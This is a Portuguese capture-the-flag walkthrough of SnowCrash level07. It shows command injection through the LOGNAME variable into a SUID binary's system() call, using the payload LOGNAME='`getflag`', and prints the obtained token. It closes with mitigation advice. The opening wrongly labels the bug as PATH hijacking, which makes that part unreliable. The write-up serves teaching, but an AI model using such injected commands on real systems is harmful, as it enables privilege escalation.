# SnowCrash — Level07 Walkthrough (Metodologia)

## Objetivo

Neste nível, o objetivo é explorar uma vulnerabilidade onde o binário chama outro programa **sem usar o caminho absoluto**, dependendo da variável de ambiente `PATH` para encontrá-lo.

Isso permite o **hijacking de PATH**: criamos um executável malicioso com o mesmo nome e fazemos o binário privilegiado executar o nosso ao invés do original.

---

## Arquivos disponíveis

Listando o diretório:

```bash
ls -l
```

Saída típica:

```
-rwsr-x---+ 1 flag07 level07  level07
```

Existe um binário SUID pertencente ao usuário `flag07`.

---

## Análise do binário

Inspecionando as strings do binário para entender o que ele chama:

```bash
strings level07
```

Trecho relevante encontrado:

```
LOGNAME
/bin/echo %s
```

O binário lê a variável de ambiente `LOGNAME` e a passa para `/bin/echo`.

Ou seja: o conteúdo de `LOGNAME` é passado diretamente como argumento para um comando do sistema — possível injeção de comando via variável de ambiente.

---

## Entendimento da vulnerabilidade

O binário executa algo equivalente a:

```c
asprintf(&cmd, "/bin/echo %s", getenv("LOGNAME"));
system(cmd);
```

Se controlarmos `LOGNAME`, controlamos o argumento passado para `system()`.

Podemos injetar um segundo comando usando `;` ou `` ` `` para executar `getflag`.

---

## Exploração

### Erro comum — aspas duplas (NÃO funciona corretamente)

```bash
LOGNAME="`getflag`" ./level07
```

Com aspas duplas, o bash **expande o backtick no shell atual** (como `level07`, sem privilégios).
O `getflag` retorna: `Check flag.Here is your token : Nope there is no token here for you sorry. Try again :)`
Esse texto é passado para `system("/bin/echo ... Try again :)")` — e o `:)` causa **syntax error** no `/bin/sh` interno.

### Solução correta — aspas simples

```bash
LOGNAME='`getflag`' ./level07
```

Com aspas simples, **nenhuma expansão ocorre no shell atual**. O binário recebe literalmente `` `getflag` `` e quando chama internamente `system("/bin/echo `getflag `")`, o `/bin/sh` do `system()` expande o backtick já com os privilégios de `flag07` (SUID).

**Regra:** aspas simples = string literal, sem expansão. Aspas duplas = o shell expande variáveis e backticks antes de passar.

---

## Resultado

Saída obtida:

```
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```

**Token obtido:**

```
fiumuikeil55xe9cu4dood66h
```

---

## Conceito aprendido

Este exercício demonstra: **Command Injection via variável de ambiente**.

Problema clássico:

```c
char *env = getenv("LOGNAME");
asprintf(&cmd, "/bin/echo %s", env);
system(cmd);
```

Qualquer entrada não sanitizada passada para `system()` permite execução arbitrária de comandos.

---

## Vulnerabilidade real equivalente

Muito comum em:

- scripts shell que usam variáveis de ambiente diretamente em comandos
- programas C/C++ que chamam `system()` ou `popen()` com input controlado pelo usuário
- binários SUID que herdam o ambiente do processo pai
- scripts de inicialização que confiam em variáveis do ambiente do usuário

---

## Mitigação

Para corrigir este tipo de vulnerabilidade:

- **Nunca** usar `system()` com input não sanitizado
- Usar funções como `execve()` com argumentos separados (sem interpolação)
- Sanitizar ou rejeitar variáveis de ambiente antes de usá-las em comandos
- Limpar o ambiente com `clearenv()` em binários SUID antes de executar subprocessos

---

## Ferramentas utilizadas

| Comando      | Função                                  |
| ------------ | ----------------------------------------- |
| `ls -l`    | listar arquivos e permissões SUID        |
| `strings`  | inspecionar strings do binário           |
| `LOGNAME=` | definir variável de ambiente com payload |
| `getflag`  | obter token do nível                     |

---

## Resultado final

Exploração realizada com sucesso via injeção de comando em variável de ambiente (`LOGNAME`).

**Token obtido:**

```
fiumuikeil55xe9cu4dood66h
```
